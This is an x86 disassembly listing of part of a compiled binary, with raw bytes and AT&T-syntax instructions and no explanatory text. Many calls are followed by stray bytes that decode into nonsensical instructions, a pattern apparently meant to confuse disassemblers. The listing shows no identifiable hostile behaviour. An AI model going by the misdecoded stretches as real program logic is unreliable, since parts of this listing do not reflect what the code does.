  403341:	56                   	push   %esi
  403342:	57                   	push   %edi
  403343:	ff 74 24 0c          	push   0xc(%esp)
  403347:	33 ff                	xor    %edi,%edi
  403349:	e8 73 9d 00 00       	call   0x40d0c1
  40334e:	b8 e8 a7 9d 00       	mov    $0x9da7e8,%eax
  403353:	00 8b f0 3b f7 74    	add    %cl,0x74f73bf0(%ebx)
  403359:	25 8b 06 83 f8       	and    $0xf883068b,%eax
  40335e:	ff 74 1e 39          	push   0x39(%esi,%ebx,1)
  403362:	7e 04                	jle    0x403368
  403364:	74 0f                	je     0x403375
  403366:	8d 4e 08             	lea    0x8(%esi),%ecx
  403369:	51                   	push   %ecx
  40336a:	50                   	push   %eax
  40336b:	e8 fc 9d 00 00       	call   0x40d16c
  403370:	8a 8b f8 eb 03 33    	mov    0x3303ebf8(%ebx),%cl
  403376:	ff 47 e8             	incl   -0x18(%edi)
  403379:	b4 9d                	mov    $0x9d,%ah
  40337b:	00 00                	add    %al,(%eax)
  40337d:	83 94 8b c7 5f 5e c2 	adcl   $0x4,-0x3da1a039(%ebx,%ecx,4)
  403384:	04 
  403385:	00 33                	add    %dh,(%ebx)
  403387:	c0 39 44             	sarb   $0x44,(%ecx)
  40338a:	24 04                	and    $0x4,%al
  40338c:	74 06                	je     0x403394
  40338e:	e8 aa 81 00 00       	call   0x40b53d
  403393:	46                   	inc    %esi
  403394:	c2 08 00             	ret    $0x8
  403397:	57                   	push   %edi
  403398:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  40339c:	83 ff ff             	cmp    $0xffffffff,%edi
  40339f:	75 17                	jne    0x4033b8
  4033a1:	8b 44 24 08          	mov    0x8(%esp),%eax
  4033a5:	8b 08                	mov    (%eax),%ecx
  4033a7:	83 c1 08             	add    $0x8,%ecx
  4033aa:	51                   	push   %ecx
  4033ab:	83 c0 0c             	add    $0xc,%eax
  4033ae:	50                   	push   %eax
  4033af:	e8 f6 5a 00 00       	call   0x408eaa
  4033b4:	59                   	pop    %ecx
  4033b5:	59                   	pop    %ecx
  4033b6:	eb 3f                	jmp    0x4033f7
  4033b8:	56                   	push   %esi
  4033b9:	8b 74 24 0c          	mov    0xc(%esp),%esi
  4033bd:	3b 7e 08             	cmp    0x8(%esi),%edi
  4033c0:	7c 22                	jl     0x4033e4
  4033c2:	8b 46 04             	mov    0x4(%esi),%eax
  4033c5:	8b 0e                	mov    (%esi),%ecx
  4033c7:	03 c7                	add    %edi,%eax
  4033c9:	0f af c8             	imul   %eax,%ecx
  4033cc:	51                   	push   %ecx
  4033cd:	ff 76 1c             	push   0x1c(%esi)
  4033d0:	89 46 08             	mov    %eax,0x8(%esi)
  4033d3:	6a 08                	push   $0x8
  4033d5:	e8 5c 5a 00 00       	call   0x408e36
  4033da:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4033db:	e8 90 5a 00 00       	call   0x408e70
  4033e0:	d1 89 46 1c 8b 46    	rorl   $1,0x468b1c46(%ecx)
  4033e6:	10 85 c0 74 03 57    	adc    %al,0x570374c0(%ebp)
  4033ec:	ff d0                	call   *%eax
  4033ee:	8b 06                	mov    (%esi),%eax
  4033f0:	0f af c7             	imul   %edi,%eax
  4033f3:	03 46 1c             	add    0x1c(%esi),%eax
  4033f6:	5e                   	pop    %esi
  4033f7:	5f                   	pop    %edi
  4033f8:	c2 08 00             	ret    $0x8
  4033fb:	8b 54 24 08          	mov    0x8(%esp),%edx
  4033ff:	85 d2                	test   %edx,%edx
  403401:	7c 13                	jl     0x403416
  403403:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  403407:	3b 51 08             	cmp    0x8(%ecx),%edx
  40340a:	7d 0a                	jge    0x403416
  40340c:	8b 01                	mov    (%ecx),%eax
  40340e:	0f af c2             	imul   %edx,%eax
  403411:	03 41 1c             	add    0x1c(%ecx),%eax
  403414:	eb 02                	jmp    0x403418
  403416:	8b c2                	mov    %edx,%eax
  403418:	85 c0                	test   %eax,%eax
  40341a:	74 07                	je     0x403423
  40341c:	83 38 00             	cmpl   $0x0,(%eax)
  40341f:	75 02                	jne    0x403423
  403421:	33 c0                	xor    %eax,%eax
  403423:	c2 08 00             	ret    $0x8
  403426:	8b 54 24 08          	mov    0x8(%esp),%edx
  40342a:	85 d2                	test   %edx,%edx
  40342c:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  403430:	7c 1b                	jl     0x40344d
  403432:	3b 51 08             	cmp    0x8(%ecx),%edx
  403435:	7d 16                	jge    0x40344d
  403437:	8b 01                	mov    (%ecx),%eax
  403439:	50                   	push   %eax
  40343a:	0f af c2             	imul   %edx,%eax
  40343d:	03 41 1c             	add    0x1c(%ecx),%eax
  403440:	6a 00                	push   $0x0
  403442:	50                   	push   %eax
  403443:	e8 5c 5c 00 00       	call   0x4090a4
  403448:	83 c4 0c             	add    $0xc,%esp
  40344b:	eb 0c                	jmp    0x403459
  40344d:	52                   	push   %edx
  40344e:	83 c1 0c             	add    $0xc,%ecx
  403451:	51                   	push   %ecx
  403452:	e8 a3 5b 00 00       	call   0x408ffa
  403457:	59                   	pop    %ecx
  403458:	59                   	pop    %ecx
  403459:	c2 08 00             	ret    $0x8
  40345c:	56                   	push   %esi
  40345d:	57                   	push   %edi
  40345e:	e8 a2 43 00 00       	call   0x407805
  403463:	ee                   	out    %al,(%dx)
  403464:	6a 20                	push   $0x20
  403466:	6a 08                	push   $0x8
  403468:	e8 d2 43 00 00       	call   0x40783f
  40346d:	24 ff                	and    $0xff,%al
  40346f:	d7                   	xlat   %ds:(%ebx)
  403470:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  403474:	8b f0                	mov    %eax,%esi
  403476:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40347a:	83 66 0c 00          	andl   $0x0,0xc(%esi)
  40347e:	89 4e 10             	mov    %ecx,0x10(%esi)
  403481:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  403485:	89 06                	mov    %eax,(%esi)
  403487:	0f af c1             	imul   %ecx,%eax
  40348a:	50                   	push   %eax
  40348b:	6a 08                	push   $0x8
  40348d:	89 4e 04             	mov    %ecx,0x4(%esi)
  403490:	89 4e 08             	mov    %ecx,0x8(%esi)
  403493:	e8 e1 43 00 00       	call   0x407879
  403498:	4a                   	dec    %edx
  403499:	ff d7                	call   *%edi
  40349b:	89 46 1c             	mov    %eax,0x1c(%esi)
  40349e:	5f                   	pop    %edi
  40349f:	8b c6                	mov    %esi,%eax
  4034a1:	5e                   	pop    %esi
  4034a2:	c2 0c 00             	ret    $0xc
  4034a5:	55                   	push   %ebp
  4034a6:	8b ec                	mov    %esp,%ebp
  4034a8:	56                   	push   %esi
  4034a9:	8b 75 08             	mov    0x8(%ebp),%esi
  4034ac:	83 7e 10 00          	cmpl   $0x0,0x10(%esi)
  4034b0:	74 1c                	je     0x4034ce
  4034b2:	56                   	push   %esi
  4034b3:	e8 02 91 00 00       	call   0x40c5ba
  4034b8:	eb 06                	jmp    0x4034c0
  4034ba:	ff 75 08             	push   0x8(%ebp)
  4034bd:	ff 56 10             	call   *0x10(%esi)
  4034c0:	8d 45 08             	lea    0x8(%ebp),%eax
  4034c3:	50                   	push   %eax
  4034c4:	56                   	push   %esi
  4034c5:	e8 26 91 00 00       	call   0x40c5f0
  4034ca:	85 c0                	test   %eax,%eax
  4034cc:	75 ec                	jne    0x4034ba
  4034ce:	5e                   	pop    %esi
  4034cf:	5d                   	pop    %ebp
  4034d0:	c2 04 00             	ret    $0x4
  4034d3:	56                   	push   %esi
  4034d4:	ff 74 24 08          	push   0x8(%esp)
  4034d8:	6a 08                	push   $0x8
  4034da:	e8 da 41 00 00       	call   0x4076b9
  4034df:	fd                   	std
  4034e0:	e8 0e 42 00 00       	call   0x4076f3
  4034e5:	e0 e8                	loopne 0x4034cf
  4034e7:	42                   	inc    %edx
  4034e8:	42                   	inc    %edx
  4034e9:	00 00                	add    %al,(%eax)
  4034eb:	8b f0                	mov    %eax,%esi
  4034ed:	74 06                	je     0x4034f5
  4034ef:	56                   	push   %esi
  4034f0:	ff 54 24 10          	call   *0x10(%esp)
  4034f4:	59                   	pop    %ecx
  4034f5:	8b c6                	mov    %esi,%eax
  4034f7:	5e                   	pop    %esi
  4034f8:	c2 0c 00             	ret    $0xc
  4034fb:	8b 44 24 04          	mov    0x4(%esp),%eax
  4034ff:	8b 48 0c             	mov    0xc(%eax),%ecx
  403502:	33 d2                	xor    %edx,%edx
  403504:	3b ca                	cmp    %edx,%ecx
  403506:	89 50 14             	mov    %edx,0x14(%eax)
  403509:	89 48 18             	mov    %ecx,0x18(%eax)
  40350c:	74 0e                	je     0x40351c
  40350e:	eb 08                	jmp    0x403518
  403510:	8b 48 18             	mov    0x18(%eax),%ecx
  403513:	8b 09                	mov    (%ecx),%ecx
  403515:	89 48 18             	mov    %ecx,0x18(%eax)
  403518:	39 11                	cmp    %edx,(%ecx)
  40351a:	75 f4                	jne    0x403510
  40351c:	c2 04 00             	ret    $0x4
  40351f:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  403523:	57                   	push   %edi
  403524:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  403528:	33 c0                	xor    %eax,%eax
  40352a:	56                   	push   %esi
  40352b:	8b 71 14             	mov    0x14(%ecx),%esi
  40352e:	85 f6                	test   %esi,%esi
  403530:	7c 1d                	jl     0x40354f
  403532:	3b 71 08             	cmp    0x8(%ecx),%esi
  403535:	7d 18                	jge    0x40354f
  403537:	8b 11                	mov    (%ecx),%edx
  403539:	0f af d6             	imul   %esi,%edx
  40353c:	03 51 1c             	add    0x1c(%ecx),%edx
  40353f:	83 3a 00             	cmpl   $0x0,(%edx)
  403542:	74 04                	je     0x403548
  403544:	8b c2                	mov    %edx,%eax
  403546:	89 37                	mov    %esi,(%edi)
  403548:	ff 41 14             	incl   0x14(%ecx)
  40354b:	85 c0                	test   %eax,%eax
  40354d:	74 dc                	je     0x40352b
  40354f:	85 c0                	test   %eax,%eax
  403551:	5e                   	pop    %esi
  403552:	75 15                	jne    0x403569
  403554:	8b 51 18             	mov    0x18(%ecx),%edx
  403557:	85 d2                	test   %edx,%edx
  403559:	74 0e                	je     0x403569
  40355b:	8d 42 08             	lea    0x8(%edx),%eax
  40355e:	89 07                	mov    %eax,(%edi)
  403560:	8b 51 18             	mov    0x18(%ecx),%edx
  403563:	8b 52 04             	mov    0x4(%edx),%edx
  403566:	89 51 18             	mov    %edx,0x18(%ecx)
  403569:	5f                   	pop    %edi
  40356a:	c2 08 00             	ret    $0x8
  40356d:	ff 74 24 08          	push   0x8(%esp)
  403571:	6a 08                	push   $0x8
  403573:	e8 68 59 00 00       	call   0x408ee0
  403578:	f0 e8 9c 59 00 00    	lock call 0x408f1a
  40357e:	5f                   	pop    %edi
  40357f:	85 c0                	test   %eax,%eax
  403581:	74 13                	je     0x403596
  403583:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  403587:	8b 11                	mov    (%ecx),%edx
  403589:	85 d2                	test   %edx,%edx
  40358b:	74 07                	je     0x403594
  40358d:	89 42 04             	mov    %eax,0x4(%edx)
  403590:	8b 11                	mov    (%ecx),%edx
  403592:	89 10                	mov    %edx,(%eax)
  403594:	89 01                	mov    %eax,(%ecx)
  403596:	83 c0 08             	add    $0x8,%eax
  403599:	c3                   	ret
  40359a:	8b 44 24 08          	mov    0x8(%esp),%eax
  40359e:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4035a2:	83 e8 08             	sub    $0x8,%eax
  4035a5:	39 01                	cmp    %eax,(%ecx)
  4035a7:	8b 10                	mov    (%eax),%edx
  4035a9:	75 0e                	jne    0x4035b9
  4035ab:	89 11                	mov    %edx,(%ecx)
  4035ad:	8b 08                	mov    (%eax),%ecx
  4035af:	85 c9                	test   %ecx,%ecx
  4035b1:	74 17                	je     0x4035ca
  4035b3:	83 61 04 00          	andl   $0x0,0x4(%ecx)
  4035b7:	eb 11                	jmp    0x4035ca
  4035b9:	8b 48 04             	mov    0x4(%eax),%ecx
  4035bc:	89 11                	mov    %edx,(%ecx)
  4035be:	8b 08                	mov    (%eax),%ecx
  4035c0:	85 c9                	test   %ecx,%ecx
  4035c2:	74 06                	je     0x4035ca
  4035c4:	8b 50 04             	mov    0x4(%eax),%edx
  4035c7:	89 51 04             	mov    %edx,0x4(%ecx)
  4035ca:	50                   	push   %eax
  4035cb:	6a 00                	push   $0x0
  4035cd:	e8 5e 5a 00 00       	call   0x409030
  4035d2:	ed                   	in     (%dx),%eax
  4035d3:	e8 92 5a 00 00       	call   0x40906a
  4035d8:	c1 c3 cc             	rol    $0xcc,%ebx
  4035db:	cc                   	int3
  4035dc:	cc                   	int3
  4035dd:	cc                   	int3
  4035de:	cc                   	int3
  4035df:	cc                   	int3
  4035e0:	55                   	push   %ebp
  4035e1:	8b ec                	mov    %esp,%ebp
  4035e3:	6a 00                	push   $0x0
  4035e5:	e8 81 3d 00 00       	call   0x40736b
  4035ea:	6a 00                	push   $0x0
  4035ec:	e8 b0 3d 00 00       	call   0x4073a1
  4035f1:	89 e8                	mov    %ebp,%eax
  4035f3:	e4 3d                	in     $0x3d,%al
  4035f5:	00 00                	add    %al,(%eax)
  4035f7:	e8 15 3e 00 00       	call   0x407411
  4035fc:	b9 be b7 61 95       	mov    $0x9561b7be,%ecx
  403601:	e8 49 3e 00 00       	call   0x40744f
  403606:	87 2a                	xchg   %ebp,(%edx)
  403608:	5c                   	pop    %esp
  403609:	62 b3 e8 7d 3e 00    	bound  %esi,0x3e7de8(%ebx)
  40360f:	00 50 6a             	add    %dl,0x6a(%eax)
  403612:	00 e8                	add    %ch,%al
  403614:	ab                   	stos   %eax,%es:(%edi)
  403615:	3e 00 00             	add    %al,%ds:(%eax)
  403618:	92                   	xchg   %eax,%edx
  403619:	51                   	push   %ecx
  40361a:	e8 de 3e 00 00       	call   0x4074fd
  40361f:	89 e8                	mov    %ebp,%eax
  403621:	12 3f                	adc    (%edi),%bh
  403623:	00 00                	add    %al,(%eax)
  403625:	5d                   	pop    %ebp
  403626:	c3                   	ret
  403627:	cc                   	int3
  403628:	cc                   	int3
  403629:	cc                   	int3
  40362a:	cc                   	int3
  40362b:	cc                   	int3
  40362c:	cc                   	int3
  40362d:	cc                   	int3
  40362e:	cc                   	int3
  40362f:	cc                   	int3
  403630:	55                   	push   %ebp
  403631:	8b ec                	mov    %esp,%ebp
  403633:	51                   	push   %ecx
  403634:	e8 9a 66 00 00       	call   0x409cd3
  403639:	2b 45 0c             	sub    0xc(%ebp),%eax
  40363c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40363f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403642:	83 39 00             	cmpl   $0x0,(%ecx)
  403645:	75 1c                	jne    0x403663
  403647:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40364a:	83 c2 05             	add    $0x5,%edx
  40364d:	52                   	push   %edx
  40364e:	6a 00                	push   $0x0
  403650:	e8 ca 67 00 00       	call   0x409e1f
  403655:	50                   	push   %eax
  403656:	e8 fa 67 00 00       	call   0x409e55
  40365b:	ad                   	lods   %ds:(%esi),%eax
  40365c:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40365f:	89 01                	mov    %eax,(%ecx)
  403661:	eb 21                	jmp    0x403684
  403663:	8b 55 fc             	mov    -0x4(%ebp),%edx
  403666:	83 c2 05             	add    $0x5,%edx
  403669:	52                   	push   %edx
  40366a:	8b 45 08             	mov    0x8(%ebp),%eax
  40366d:	8b 08                	mov    (%eax),%ecx
  40366f:	51                   	push   %ecx
  403670:	6a 00                	push   $0x0
  403672:	e8 92 66 00 00       	call   0x409d09
  403677:	73 52                	jae    0x4036cb
  403679:	e8 c5 66 00 00       	call   0x409d43
  40367e:	f4                   	hlt
  40367f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403682:	89 01                	mov    %eax,(%ecx)
  403684:	8b 55 fc             	mov    -0x4(%ebp),%edx
  403687:	52                   	push   %edx
  403688:	e8 f0 66 00 00       	call   0x409d7d
  40368d:	03 45 0c             	add    0xc(%ebp),%eax
  403690:	50                   	push   %eax
  403691:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403694:	8b 11                	mov    (%ecx),%edx
  403696:	52                   	push   %edx
  403697:	e8 17 67 00 00       	call   0x409db3
  40369c:	8b 45 0c             	mov    0xc(%ebp),%eax
  40369f:	e8 45 67 00 00       	call   0x409de9
  4036a4:	8b e5                	mov    %ebp,%esp
  4036a6:	5d                   	pop    %ebp
  4036a7:	c2 08 00             	ret    $0x8
  4036aa:	cc                   	int3
  4036ab:	cc                   	int3
  4036ac:	cc                   	int3
  4036ad:	cc                   	int3
  4036ae:	cc                   	int3
  4036af:	cc                   	int3
  4036b0:	09 d2                	or     %edx,%edx
  4036b2:	75 05                	jne    0x4036b9
  4036b4:	e8 03 9f 00 00       	call   0x40d5bc
  4036b9:	09 c9                	or     %ecx,%ecx
  4036bb:	75 05                	jne    0x4036c2
  4036bd:	e8 c4 9e 00 00       	call   0x40d586
  4036c2:	8a 22                	mov    (%edx),%ah
  4036c4:	42                   	inc    %edx
  4036c5:	8a 01                	mov    (%ecx),%al
  4036c7:	41                   	inc    %ecx
  4036c8:	38 c4                	cmp    %al,%ah
  4036ca:	75 0c                	jne    0x4036d8
  4036cc:	08 e4                	or     %ah,%ah
  4036ce:	75 f2                	jne    0x4036c2
  4036d0:	e8 7b 9e 00 00       	call   0x40d550
  4036d5:	85 c0                	test   %eax,%eax
  4036d7:	c3                   	ret
  4036d8:	31 c0                	xor    %eax,%eax
  4036da:	85 c0                	test   %eax,%eax
  4036dc:	c3                   	ret
  4036dd:	cc                   	int3
  4036de:	cc                   	int3
  4036df:	cc                   	int3
  4036e0:	55                   	push   %ebp
  4036e1:	8b ec                	mov    %esp,%ebp
  4036e3:	83 ec 0c             	sub    $0xc,%esp
  4036e6:	89 55 f4             	mov    %edx,-0xc(%ebp)
  4036e9:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  4036ed:	74 35                	je     0x403724
  4036ef:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4036f2:	50                   	push   %eax
  4036f3:	e8 70 6c 00 00       	call   0x40a368
  4036f8:	83 c4 04             	add    $0x4,%esp
  4036fb:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4036fe:	e8 9b 6c 00 00       	call   0x40a39e
  403703:	00 51 8b             	add    %dl,-0x75(%ecx)
  403706:	55                   	push   %ebp
  403707:	f8                   	clc
  403708:	52                   	push   %edx
  403709:	e8 ca 6c 00 00       	call   0x40a3d8
  40370e:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403711:	8b 45 f8             	mov    -0x8(%ebp),%eax
  403714:	50                   	push   %eax
  403715:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  403718:	51                   	push   %ecx
  403719:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40371c:	52                   	push   %edx
  40371d:	e8 ec 6c 00 00       	call   0x40a40e
  403722:	eb 0e                	jmp    0x403732
  403724:	e8 cf 6b 00 00       	call   0x40a2f8
  403729:	e8 00 6c 00 00       	call   0x40a32e
  40372e:	ae                   	scas   %es:(%edi),%al
  40372f:	c6 00 00             	movb   $0x0,(%eax)
  403732:	8b e5                	mov    %ebp,%esp
  403734:	5d                   	pop    %ebp
  403735:	c3                   	ret
  403736:	cc                   	int3
  403737:	cc                   	int3
  403738:	cc                   	int3
  403739:	cc                   	int3
  40373a:	cc                   	int3
  40373b:	cc                   	int3
  40373c:	cc                   	int3
  40373d:	cc                   	int3
  40373e:	cc                   	int3
  40373f:	cc                   	int3
  403740:	55                   	push   %ebp
  403741:	8b ec                	mov    %esp,%ebp
  403743:	50                   	push   %eax
  403744:	52                   	push   %edx
  403745:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  403749:	74 13                	je     0x40375e
  40374b:	8b 45 08             	mov    0x8(%ebp),%eax
  40374e:	50                   	push   %eax
  40374f:	6a 00                	push   $0x0
  403751:	e8 f7 5e 00 00       	call   0x40964d
  403756:	05 51 e8 2a 5f       	add    $0x5f2ae851,%eax
  40375b:	00 00                	add    %al,(%eax)
  40375d:	21 5a 58             	and    %ebx,0x58(%edx)
  403760:	5d                   	pop    %ebp
  403761:	c2 04 00             	ret    $0x4
  403764:	cc                   	int3
  403765:	cc                   	int3
  403766:	cc                   	int3
  403767:	cc                   	int3
  403768:	cc                   	int3
  403769:	cc                   	int3
  40376a:	cc                   	int3
  40376b:	cc                   	int3
  40376c:	cc                   	int3
  40376d:	cc                   	int3
  40376e:	cc                   	int3
  40376f:	cc                   	int3
  403770:	55                   	push   %ebp
  403771:	8b ec                	mov    %esp,%ebp
  403773:	51                   	push   %ecx
  403774:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  403778:	74 3d                	je     0x4037b7
  40377a:	8b 45 0c             	mov    0xc(%ebp),%eax
  40377d:	50                   	push   %eax
  40377e:	e8 cb 90 00 00       	call   0x40c84e
  403783:	83 c4 04             	add    $0x4,%esp
  403786:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403789:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40378c:	83 c1 05             	add    $0x5,%ecx
  40378f:	51                   	push   %ecx
  403790:	6a 00                	push   $0x0
  403792:	e8 ed 90 00 00       	call   0x40c884
  403797:	cc                   	int3
  403798:	52                   	push   %edx
  403799:	e8 20 91 00 00       	call   0x40c8be
  40379e:	44                   	inc    %esp
  40379f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4037a2:	89 01                	mov    %eax,(%ecx)
  4037a4:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4037a7:	52                   	push   %edx
  4037a8:	8b 45 0c             	mov    0xc(%ebp),%eax
  4037ab:	50                   	push   %eax
  4037ac:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4037af:	8b 11                	mov    (%ecx),%edx
  4037b1:	52                   	push   %edx
  4037b2:	e8 41 91 00 00       	call   0x40c8f8
  4037b7:	8b e5                	mov    %ebp,%esp
  4037b9:	5d                   	pop    %ebp
  4037ba:	c2 08 00             	ret    $0x8
  4037bd:	cc                   	int3
  4037be:	cc                   	int3
  4037bf:	cc                   	int3
  4037c0:	55                   	push   %ebp
  4037c1:	8b ec                	mov    %esp,%ebp
  4037c3:	51                   	push   %ecx
  4037c4:	e8 20 44 00 00       	call   0x407be9
  4037c9:	b3 fb                	mov    $0xfb,%bl
  4037cb:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  4037cf:	74 69                	je     0x40383a
  4037d1:	8b 45 0c             	mov    0xc(%ebp),%eax
  4037d4:	50                   	push   %eax
  4037d5:	e8 f4 44 00 00       	call   0x407cce
  4037da:	83 c4 04             	add    $0x4,%esp
  4037dd:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4037e0:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4037e3:	83 39 00             	cmpl   $0x0,(%ecx)
  4037e6:	75 1c                	jne    0x403804
  4037e8:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4037eb:	83 c2 05             	add    $0x5,%edx
  4037ee:	52                   	push   %edx
  4037ef:	6a 00                	push   $0x0
  4037f1:	e8 f2 45 00 00       	call   0x407de8
  4037f6:	50                   	push   %eax
  4037f7:	e8 22 46 00 00       	call   0x407e1e
  4037fc:	b2 8b                	mov    $0x8b,%dl
  4037fe:	4d                   	dec    %ebp
  4037ff:	08 89 01 eb 21 8b    	or     %cl,-0x74de14ff(%ecx)
  403805:	55                   	push   %ebp
  403806:	fc                   	cld
  403807:	83 c2 05             	add    $0x5,%edx
  40380a:	52                   	push   %edx
  40380b:	8b 45 08             	mov    0x8(%ebp),%eax
  40380e:	8b 08                	mov    (%eax),%ecx
  403810:	51                   	push   %ecx
  403811:	6a 00                	push   $0x0
  403813:	e8 26 45 00 00       	call   0x407d3e
  403818:	ce                   	into
  403819:	52                   	push   %edx
  40381a:	e8 59 45 00 00       	call   0x407d78
  40381f:	4d                   	dec    %ebp
  403820:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403823:	89 01                	mov    %eax,(%ecx)
  403825:	8b 55 fc             	mov    -0x4(%ebp),%edx
  403828:	52                   	push   %edx
  403829:	8b 45 0c             	mov    0xc(%ebp),%eax
  40382c:	50                   	push   %eax
  40382d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403830:	8b 11                	mov    (%ecx),%edx
  403832:	52                   	push   %edx
  403833:	e8 7a 45 00 00       	call   0x407db2
  403838:	eb 25                	jmp    0x40385f
  40383a:	8b 45 08             	mov    0x8(%ebp),%eax
  40383d:	83 38 00             	cmpl   $0x0,(%eax)
  403840:	74 1d                	je     0x40385f
  403842:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403845:	8b 11                	mov    (%ecx),%edx
  403847:	52                   	push   %edx
  403848:	6a 00                	push   $0x0
  40384a:	e8 d5 43 00 00       	call   0x407c24
  40384f:	50                   	push   %eax
  403850:	e8 05 44 00 00       	call   0x407c5a
  403855:	62 8b 4d 08 e8 36    	bound  %ecx,0x36e8084d(%ebx)
  40385b:	44                   	inc    %esp
  40385c:	00 00                	add    %al,(%eax)
  40385e:	52                   	push   %edx
  40385f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403862:	83 c0 01             	add    $0x1,%eax
  403865:	8b e5                	mov    %ebp,%esp
  403867:	5d                   	pop    %ebp
  403868:	c2 08 00             	ret    $0x8
  40386b:	cc                   	int3
  40386c:	cc                   	int3
  40386d:	cc                   	int3
  40386e:	cc                   	int3
  40386f:	cc                   	int3
  403870:	55                   	push   %ebp
  403871:	8b ec                	mov    %esp,%ebp
  403873:	83 ec 08             	sub    $0x8,%esp
  403876:	e8 65 4f 00 00       	call   0x4087e0
  40387b:	03 45 08             	add    0x8(%ebp),%eax
  40387e:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403881:	e8 90 4f 00 00       	call   0x408816
  403886:	76 83                	jbe    0x40380b
  403888:	e9 04 39 4d f8       	jmp    0xf88d7191
  40388d:	7c 33                	jl     0x4038c2
  40388f:	8b 55 f8             	mov    -0x8(%ebp),%edx
  403892:	e8 29 50 00 00       	call   0x4088c0
  403897:	de e8                	fsubrp %st,%st(0)
  403899:	5d                   	pop    %ebp
  40389a:	50                   	push   %eax
  40389b:	00 00                	add    %al,(%eax)
  40389d:	65 e8 91 50 00 00    	gs call 0x408934
  4038a3:	83 c0 05             	add    $0x5,%eax
  4038a6:	50                   	push   %eax
  4038a7:	e8 be 50 00 00       	call   0x40896a
  4038ac:	ca 51 6a             	lret   $0x6a51
  4038af:	00 e8                	add    %ch,%al
  4038b1:	ef                   	out    %eax,(%dx)
  4038b2:	50                   	push   %eax
  4038b3:	00 00                	add    %al,(%eax)
  4038b5:	47                   	inc    %edi
  4038b6:	52                   	push   %edx
  4038b7:	e8 22 51 00 00       	call   0x4089de
  4038bc:	7b e8                	jnp    0x4038a6
  4038be:	56                   	push   %esi
  4038bf:	51                   	push   %ecx
  4038c0:	00 00                	add    %al,(%eax)
  4038c2:	e8 89 4f 00 00       	call   0x408850
  4038c7:	03 45 0c             	add    0xc(%ebp),%eax
  4038ca:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4038cd:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4038d0:	03 4d 08             	add    0x8(%ebp),%ecx
  4038d3:	e8 ae 4f 00 00       	call   0x408886
  4038d8:	96                   	xchg   %eax,%esi
  4038d9:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4038dc:	8b e5                	mov    %ebp,%esp
  4038de:	5d                   	pop    %ebp
  4038df:	c2 08 00             	ret    $0x8
  4038e2:	cc                   	int3
  4038e3:	cc                   	int3
  4038e4:	cc                   	int3
  4038e5:	cc                   	int3
  4038e6:	cc                   	int3
  4038e7:	cc                   	int3
  4038e8:	cc                   	int3
  4038e9:	cc                   	int3
  4038ea:	cc                   	int3
  4038eb:	cc                   	int3
  4038ec:	cc                   	int3
  4038ed:	cc                   	int3
  4038ee:	cc                   	int3
  4038ef:	cc                   	int3
  4038f0:	55                   	push   %ebp
  4038f1:	8b ec                	mov    %esp,%ebp
  4038f3:	e8 a6 52 00 00       	call   0x408b9e
  4038f8:	2b 45 08             	sub    0x8(%ebp),%eax
  4038fb:	e8 d4 52 00 00       	call   0x408bd4
  403900:	5d                   	pop    %ebp
  403901:	c2 04 00             	ret    $0x4
  403904:	cc                   	int3
  403905:	cc                   	int3
  403906:	cc                   	int3
  403907:	cc                   	int3
  403908:	cc                   	int3
  403909:	cc                   	int3
  40390a:	cc                   	int3
  40390b:	cc                   	int3
  40390c:	cc                   	int3
  40390d:	cc                   	int3
  40390e:	cc                   	int3
  40390f:	cc                   	int3
  403910:	55                   	push   %ebp
  403911:	8b ec                	mov    %esp,%ebp
  403913:	51                   	push   %ecx
  403914:	8b 45 08             	mov    0x8(%ebp),%eax
  403917:	03 45 10             	add    0x10(%ebp),%eax
  40391a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40391d:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  403921:	7e 27                	jle    0x40394a
  403923:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403926:	8b 55 0c             	mov    0xc(%ebp),%edx
  403929:	8b 02                	mov    (%edx),%eax
  40392b:	89 01                	mov    %eax,(%ecx)
  40392d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403930:	83 c1 04             	add    $0x4,%ecx
  403933:	89 4d 08             	mov    %ecx,0x8(%ebp)
  403936:	8b 55 0c             	mov    0xc(%ebp),%edx
  403939:	83 c2 04             	add    $0x4,%edx
  40393c:	89 55 0c             	mov    %edx,0xc(%ebp)
  40393f:	8b 45 10             	mov    0x10(%ebp),%eax
  403942:	83 e8 04             	sub    $0x4,%eax
